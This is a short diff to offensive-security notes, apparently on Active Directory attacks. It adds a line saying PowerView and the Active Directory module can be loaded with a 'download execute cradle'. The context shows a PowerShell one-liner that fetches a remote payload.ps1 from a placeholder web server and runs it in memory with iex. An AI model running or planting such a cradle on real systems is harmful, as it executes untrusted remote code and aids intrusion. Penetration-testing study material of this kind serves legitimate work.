@@ -1,4 +1,5 @@
 # Download execute cradle 
+## Power View (PV) and the Active Directory Module discussed further on can be Downloaded and Executed with these methods.
 
 ```PowerShell
 iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1') 
